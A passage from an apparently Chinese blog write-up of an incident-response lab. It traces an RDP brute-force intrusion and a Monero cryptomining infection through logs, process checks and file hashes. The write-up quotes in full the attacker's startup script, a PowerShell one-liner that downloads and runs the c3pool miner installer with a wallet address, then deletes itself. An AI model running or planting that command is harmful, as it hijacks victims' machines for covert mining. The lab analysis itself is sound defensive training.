+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229005025829.png" alt="image-20251229005025829"></p>
+<p>提取md5</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229005200070.png" alt="image-20251229005200070"></p>
+<h2 id="攻击者留下的flag"><a href="#攻击者留下的flag" class="headerlink" title="攻击者留下的flag"></a>攻击者留下的flag</h2><p>flag也在shift后门中</p>
+<h1 id="挖矿事件"><a href="#挖矿事件" class="headerlink" title="挖矿事件"></a>挖矿事件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前景需要：机房运维小陈，下班后发现还有工作没完成，然后上机器越用越卡，请你帮他看看原因。</span><br><span class="line"></span><br><span class="line">相关账户密码：</span><br><span class="line">Administrator/zgsf@123</span><br><span class="line"></span><br><span class="line">攻击者的 IP 地址；192.168.115.131</span><br><span class="line">攻击者开始攻击的时间；2024-05-21 20:25:22</span><br><span class="line">攻击者攻击的端口；3389</span><br><span class="line">挖矿程序的 MD5；ee9c5ea77fef2f1df18de61029199168</span><br><span class="line">后门脚本的 MD5；8414900f4c896964497c2cf6552ec4b9</span><br><span class="line">矿池的 URL；c3pool.org</span><br><span class="line">钱包的 URL；4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y</span><br><span class="line">攻击者入侵流程；</span><br></pre></td></tr></table></figure>
+
+<p>挖矿事件，第一步分析异常进程和CPU</p>
+<p>发现存在一个占用CPU异常高</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229230212372.png" alt="image-20251229230212372"></p>
+<blockquote>
+<p>xmrig.exe</p>
+<p><code>XMRig</code> 是一款开源的加密货币挖矿软件，主要用于挖掘Monero (XMR)，一种专注于隐私的数字货币。它支持RandomX， CryptoNight， AstroBWT和Argon2挖掘算法，这些算法针对CPU和GPU性能进行了优化。XMRig由于其高效和可配置性而被广泛使用，但它也因嵌入恶意软件和用于非法加密劫持活动的脚本而臭名昭著。攻击者通常将XMRig部署在已被入侵的机器上，以秘密挖掘Monero，利用其匿名交易特性隐藏踪迹。</p>
+</blockquote>
+<p>确定为挖矿程序，计算md5</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229230923433.png"></p>
+<blockquote>
+<p>工具可以直接查看路径以及MD5</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229231020107.png" alt="image-20251229231020107"></p>
+</blockquote>
+<p>既然已经传挖矿程序了，那就是已经拿到shell了，分析系统日志</p>
+<p>先是登录失败，后来是登录成功，</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229231130418.png" alt="image-20251229231130418"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229231153962.png" alt="image-20251229231153962"></p>
+<p>攻击者ip为192.168.115.131</p>
+<p>并且可以看到从2024-05-21 20:25:22开始有登录失败的日志，说明攻击者开始攻击时间为：2024-05-21 20:25:22</p>
+<p>攻击者刚开始20:25:22登录失败，登录类型为3，是通过网络连接登录</p>
+<p>20:25:22登录成功，此时登录类型仍为3，也是通过网络连接登录</p>
+<p>查看RDP登录，发现攻击者在20:25:22 以及之后通过RDP登录</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229232523290.png" alt="image-20251229232523290"></p>
+<p>RDP默认端口为3389，攻击者攻击端口为3389</p>
+<p>火绒剑分析启动项，存在systems.bat文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229233416715.png" alt="image-20251229233416715"></p>
+<blockquote>
+<p>使用hawkeye也可以</p>
+</blockquote>
+<p>查看该文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229233540820.png" alt="image-20251229233540820"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -Command &quot;$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += &#x27;.bat&#x27;; $wc.DownloadFile(&#x27;https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.bat&#x27;, $tempfile); &amp; $tempfile 4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y; Remove-Item -Force $tempfile&quot;</span><br></pre></td></tr></table></figure>
+
+<p>分析：</p>
+<blockquote>
+<h3 id="1-命令分解"><a href="#1-命令分解" class="headerlink" title="1. 命令分解"></a>1. <strong>命令分解</strong></h3><p>powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建WebClient对象用于下载文件</span><br><span class="line">$wc = New-Object System.Net.WebClient;</span><br><span class="line"></span><br><span class="line"># 在临时目录创建临时文件，扩展名为.bat</span><br><span class="line">$tempfile = [System.IO.Path]::GetTempFileName();</span><br><span class="line">$tempfile += &#x27;.bat&#x27;;  # 最终文件类似：C:\Users\xxx\AppData\Local\Temp\tmp1234.tmp.bat</span><br><span class="line"></span><br><span class="line"># 从指定URL下载文件到临时bat文件</span><br><span class="line">$wc.DownloadFile(&#x27;https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.bat&#x27;, $tempfile);</span><br><span class="line"></span><br><span class="line"># 执行下载的bat文件，并传递一个参数（疑似钱包地址）</span><br><span class="line">&amp; $tempfile 4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y;</span><br><span class="line"></span><br><span class="line"># 执行后删除bat文件（清理痕迹）</span><br><span class="line">Remove-Item -Force $tempfile</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-关键发现"><a href="#2-关键发现" class="headerlink" title="2. 关键发现"></a>2. <strong>关键发现</strong></h3><p><strong>钱包地址</strong>：</p>
+<p>text</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这是Monero（门罗币）的<strong>钱包地址</strong></li>
+<li>C3Pool是一个知名的加密货币矿池</li>
+</ul>
+<p><strong>下载的BAT文件</strong>：</p>
+<ul>
+<li>来自：<code>https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.bat</code></li>
+<li>文件名明确表明是矿工安装程序</li>
+</ul>
+</blockquote>
+<p>该bat为攻击者留下的后门文件，内容为启动时执行该bat，进而下载并执行一个挖矿木马安装脚本</p>
+<p>计算md5</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\AppData&gt;CertUtil -hashfile systems.bat MD5</span><br><span class="line">MD5 的 systems.bat 哈希:</span><br><span class="line">8414900f4c896964497c2cf6552ec4b9</span><br><span class="line">CertUtil: -hashfile 命令成功完成。</span><br></pre></td></tr></table></figure>
+
+<p><strong>矿池（Mining Pool）是指一种由多个矿工（矿机）组成的集体，通过共享算力</strong>共同挖掘加密货币（如比特币、门罗币等），然后按照各自贡献的算力分配奖励的方式。</p>
+<p><strong>矿池的运作流程</strong></p>
+<ol>
+<li>你连接到矿池服务器（比如 <code>c3pool.org</code>）；</li>
+<li>矿池给你分配任务（一个区块的子任务）；</li>
+<li>你用自己的 CPU&#x2F;GPU 进行计算（挖矿）；</li>
+<li>计算结果上传回矿池；</li>
+<li>矿池中有人挖中一个区块，所有人按贡献分红；</li>
+<li>收益打到你提供的钱包地址。</li>
+</ol>
+<p>则矿池地址为c3pool.org</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229234348675.png" alt="image-20251229234348675"></p>
+<p>钱包地址为：4APXVhukGNiR5kqqVC7jwiVaa5jDxUgPohEtAyuRS1uyeL6K1LkkBy9SKx5W1M7gYyNneusud6A8hKjJCtVbeoFARuQTu4Y</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229234510068.png" alt="image-20251229234510068"></p>
+<p>攻击者的攻击流程，由于并没有开启web服务等其他服务，并且存在RDP大量登录失败的信息，推测攻击者应该为RDP暴力破解进入主机，进入主机之后留下后门systems.ba并添加启动项，从而在受害者主机挖矿</p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/hexo/%E5%A4%B4%E5%83%8F.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/hexo/%E5%A4%B4%E5%83%8F.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">At4ckxu</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://attackxu.uno/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://attackxu.uno/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/')">应急响应-知攻善防应急响应靶场</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://attackxu.uno/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=应急响应-知攻善防应急响应靶场&amp;url=https://attackxu.uno/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/&amp;pic=https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/060-zhigongshanfang-20260420-150300.png" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://attackxu.uno" target="_blank">At4ckxu の Blog</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E9%9D%B6%E5%9C%BA/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>靶场<span class="tagsPageCount">14</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/061-mht-20260420-150300.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%A0%B4%E9%98%B5%E9%98%81/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/059-pozhenge-20260420-150259.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">应急响应-破阵阁</div></div></a></div><div class="next-post pull-right"><a href="/2026/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-MHT%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/061-mht-20260420-150300.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">应急响应-MHT应急响应靶场</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2025/05/09/sqlilabs%201-22%E5%85%B3%E6%80%9D%E8%B7%AF/" title="sqlilabs 1-22关思路"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/045-sqlilabs-1-22-20260407-160045.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-05-09</div><div class="title">sqlilabs 1-22关思路</div></div></a></div><div><a href="/2025/05/27/vAPI%E9%9D%B6%E5%9C%BA/" title="vAPI靶场"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/050-vapi-20260407-160050.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-05-27</div><div class="title">vAPI靶场</div></div></a></div><div><a href="/2026/04/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-MemLabs/" title="内存取证-MemLabs"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/057-memory-memlabs-20260420-150258.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-04-20</div><div class="title">内存取证-MemLabs</div></div></a></div><div><a href="/2026/04/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-%E4%B8%8D%E7%9F%A5%E5%90%8DLab/" title="内存取证-不知名Lab"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/055-memory-unknown-lab-20260420-150256.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-04-20</div><div class="title">内存取证-不知名Lab</div></div></a></div><div><a href="/2026/04/20/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-%E9%87%91%E7%A0%96%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/" title="内存取证-金砖技能大赛"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/056-memory-brics-20260420-150257.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2026-04-20</div><div class="title">内存取证-金砖技能大赛</div></div></a></div><div><a href="/2025/05/27/%E5%9F%BA%E4%BA%8Exss-lab%E7%9A%84%E7%BB%95%E8%BF%87/" title="基于xss-lab的绕过"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/002-xss-lab-20260407-160054.png" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-05-27</div><div class="title">基于xss-lab的绕过</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/hexo/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description">这个世界需要我们无限探索</div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">At4ckxu</h1><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hhhanxx" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/487720257" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%8E%AF%E5%A2%83"><span class="toc-number">1.</span> <span class="toc-text">前置环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web1"><span class="toc-number">2.</span> <span class="toc-text">Web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84shell%E5%AF%86%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">攻击者的shell密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84IP%E5%9C%B0%E5%9D%80"><span class="toc-number">2.2.</span> <span class="toc-text">攻击者的IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E5%90%8D%E7%A7%B0"><span class="toc-number">2.3.</span> <span class="toc-text">攻击者的隐藏账户名称</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%9F%BF%E6%B1%A0%E5%9F%9F%E5%90%8D"><span class="toc-number">2.4.</span> <span class="toc-text">攻击者挖矿程序的矿池域名</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web2"><span class="toc-number">3.</span> <span class="toc-text">Web2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%88%E4%B8%A4%E4%B8%AA%EF%BC%89"><span class="toc-number">3.1.</span> <span class="toc-text">攻击者的IP地址（两个）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84webshell%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">3.2.</span> <span class="toc-text">攻击者的webshell文件名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84webshell%E5%AF%86%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">攻击者的webshell密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84QQ%E5%8F%B7"><span class="toc-number">3.4.</span> <span class="toc-text">攻击者的QQ号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%AAIP%E5%9C%B0%E5%9D%80"><span class="toc-number">3.5.</span> <span class="toc-text">攻击者的服务器伪IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E6%98%AF%E5%A6%82%E4%BD%95%E5%85%A5%E4%BE%B5%E7%9A%84%EF%BC%88%E9%80%89%E6%8B%A9%E9%A2%98%EF%BC%89"><span class="toc-number">3.6.</span> <span class="toc-text">攻击者是如何入侵的（选择题）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web3"><span class="toc-number">4.</span> <span class="toc-text">Web3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E4%B8%A4%E4%B8%AAIP%E5%9C%B0%E5%9D%80"><span class="toc-number">4.1.</span> <span class="toc-text">攻击者的两个IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E9%9A%90%E8%97%8F%E7%94%A8%E6%88%B7%E5%90%8D%E7%A7%B0"><span class="toc-number">4.2.</span> <span class="toc-text">攻击者隐藏用户名称</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E4%B8%AA%E6%94%BB%E5%87%BB%E8%80%85%E7%95%99%E4%B8%8B%E7%9A%84flag"><span class="toc-number">4.3.</span> <span class="toc-text">三个攻击者留下的flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux1"><span class="toc-number">5.</span> <span class="toc-text">linux1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7"><span class="toc-number">5.1.</span> <span class="toc-text">账户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-%E8%BF%9B%E7%A8%8B-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.2.</span> <span class="toc-text">端口&#x2F;进程&#x2F;网络连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">5.3.</span> <span class="toc-text">历史命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%AE%E6%94%B9%E7%9A%84%E8%AF%A5%E6%96%87%E4%BB%B6"><span class="toc-number">5.4.</span> <span class="toc-text">查看修改的该文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">5.5.</span> <span class="toc-text">定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97"><span class="toc-number">5.6.</span> <span class="toc-text">日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="toc-number">5.7.</span> <span class="toc-text">查看文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux2"><span class="toc-number">6.</span> <span class="toc-text">Linux2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">6.1.</span> <span class="toc-text">数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7-1"><span class="toc-number">6.2.</span> <span class="toc-text">账户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4-1"><span class="toc-number">6.3.</span> <span class="toc-text">历史命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1"><span class="toc-number">6.4.</span> <span class="toc-text">查看服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF"><span class="toc-number">6.5.</span> <span class="toc-text">宝塔面板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97-1"><span class="toc-number">6.6.</span> <span class="toc-text">日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.7.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6"><span class="toc-number">6.8.</span> <span class="toc-text">文件</span></a></li></ol></li><li 